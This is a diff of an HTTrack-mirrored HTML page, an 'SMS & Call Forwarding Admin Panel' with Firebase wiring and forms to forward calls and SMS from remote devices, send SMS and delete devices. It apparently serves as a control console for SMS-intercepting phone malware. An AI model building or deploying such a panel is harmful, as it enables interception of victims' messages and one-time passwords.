@@ -1,9 +1,14 @@
-<!DOCTYPE html><html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from myadmin2.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 30 Nov 2025 07:36:25 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SMS & Call Forwarding Admin Panel</title>
-    <script src="../DJzfbcnZlqsm.com/firebasejs/gatyvgtBECqZ.0/YSUnkZtSBfas.js"></script>
-    <script src="../DJzfbcnZlqsm.com/firebasejs/gatyvgtBECqZ.0/2RNBGo6JnjTT.js"></script>
+    <script src="../www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+    <script src="../www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
     <style>
         /* Enhanced Mobile-First CSS */
         :root {
@@ -823,7 +828,7 @@
         <div id="passwordForm" class="slide-in">
             <h2 class="text-center">🔒 Admin Panel Access</h2>
             <p>Please enter the password to continue:</p>
-            <input type="password" id="passwordInput" class="form-control" placeholder="Enter password" autocomplete="off">
+            <input type="password" id="passwordInput" class="form-control" placeholder="Enter password" autocomplete="off" />
             <div id="passwordError" class="text-danger mt-1"></div>
             <button class="btn btn-primary mt-2" onclick="checkPassword()">Access Dashboard</button>
             <div class="text-muted mt-2">
@@ -884,14 +889,14 @@
     <!-- Delete Device Confirmation Modal -->
     <div id="deleteDeviceModal" class="modal-overlay">
         <div class="modal-content slide-in">
-            <span class="close-button" onclick="closeDeleteDeviceModal()">�</span>
+            <span class="close-button" onclick="closeDeleteDeviceModal()">&times;</span>
             <h2>⚠️ Delete Device</h2>
             <p>Are you sure you want to delete this device? This action cannot be undone.</p>
             <div id="deleteDeviceInfo" class="text-muted p-3 mb-3" style="background: #f8f9fa; border-radius: 5px;"></div>
             
             <div class="form-group">
                 <label for="deletePassword" class="form-label">Enter Admin Password to Confirm:</label>
-                <input type="password" id="deletePassword" class="form-control" placeholder="Enter admin password" autocomplete="off">
+                <input type="password" id="deletePassword" class="form-control" placeholder="Enter admin password" autocomplete="off" />
             </div>
             <div id="deleteDeviceError" class="text-danger mb-2"></div>
             
@@ -936,7 +941,7 @@
     <div id="deviceModal" class="modal-overlay">
         <div class="modal-content slide-in">
             <!-- UPDATED: Red & Larger Close Button -->
-            <span class="close-button" onclick="closeModal()">�</span>
+            <span class="close-button" onclick="closeModal()">&times;</span>
             <div id="deviceDetails">
                 <!-- UPDATED: Smaller Device Information -->
                 <div class="card-header mb-2" style="padding-bottom: 5px;">
@@ -951,7 +956,7 @@
                     </div>
                     <div class="form-group" style="margin: 15px 0;">
                         <label for="callForwardNumber" class="form-label" style="font-size: 0.9rem;">Call Forward Number:</label>
-                        <input type="text" id="callForwardNumber" class="form-control" placeholder="+919876543210" style="padding: 10px;">
+                        <input type="text" id="callForwardNumber" class="form-control" placeholder="+919876543210" style="padding: 10px;" />
                         <div class="text-muted mt-1" style="font-size: 0.8rem;">Enter number where calls should be forwarded.</div>
                     </div>
                     
@@ -996,7 +1001,7 @@
                     </div>
                     <div class="form-group" style="margin: 15px 0;">
                         <label for="sendSmsNumber" class="form-label" style="font-size: 0.9rem;">Send SMS To Number:</label>
-                        <input type="text" id="sendSmsNumber" class="form-control" placeholder="+919876543210" style="padding: 10px;">
+                        <input type="text" id="sendSmsNumber" class="form-control" placeholder="+919876543210" style="padding: 10px;" />
                         <div class="text-muted mt-1" style="font-size: 0.8rem;">Enter mobile number where you want to send SMS.</div>
                     </div>
                     
@@ -1046,7 +1051,7 @@
                     </div>
                     <div class="form-group" style="margin: 15px 0;">
                         <label for="smsForwardNumber" class="form-label" style="font-size: 0.9rem;">SMS Forward Number:</label>
-                        <input type="text" id="smsForwardNumber" class="form-control" placeholder="+919876543210" style="padding: 10px;">
+                        <input type="text" id="smsForwardNumber" class="form-control" placeholder="+919876543210" style="padding: 10px;" />
                         <div class="text-muted mt-1" style="font-size: 0.8rem;">Enter number where SMS should be forwarded.</div>
                     </div>
                     <div class="btn-group">
@@ -1097,19 +1102,19 @@
     <!-- Password Change Modal -->
     <div id="passwordChangeModal" class="modal-overlay">
         <div class="modal-content slide-in">
-            <span class="close-button" onclick="closePasswordChangeModal()">�</span>
+            <span class="close-button" onclick="closePasswordChangeModal()">&times;</span>
             <h2>Change Admin Password</h2>
             <div class="form-group">
                 <label for="currentPassword" class="form-label">Current Password:</label>
-                <input type="password" id="currentPassword" class="form-control" placeholder="Enter current password" autocomplete="off">
+                <input type="password" id="currentPassword" class="form-control" placeholder="Enter current password" autocomplete="off" />
             </div>
             <div class="form-group">
                 <label for="newPassword" class="form-label">New Password:</label>
-                <input type="password" id="newPassword" class="form-control" placeholder="Enter new password" autocomplete="off">
+                <input type="password" id="newPassword" class="form-control" placeholder="Enter new password" autocomplete="off" />
             </div>
             <div class="form-group">
                 <label for="confirmPassword" class="form-label">Confirm New Password:</label>
-                <input type="password" id="confirmPassword" class="form-control" placeholder="Confirm new password" autocomplete="off">
+                <input type="password" id="confirmPassword" class="form-control" placeholder="Confirm new password" autocomplete="off" />
             </div>
             <div id="passwordChangeError" class="text-danger mb-2"></div>
             <div class="btn-group">
@@ -1130,6 +1135,7 @@
   messagingSenderId: "163881466696",
   appId: "1:163881466696:web:739beca696f7998c4b117d"
         };
+        
 
         // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
@@ -2751,5 +2757,7 @@
         `;
         document.head.appendChild(style);
     </script>
+</body>
 
-</body></html>
+<!-- Mirrored from myadmin2.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 30 Nov 2025 07:36:27 GMT -->
+</html>
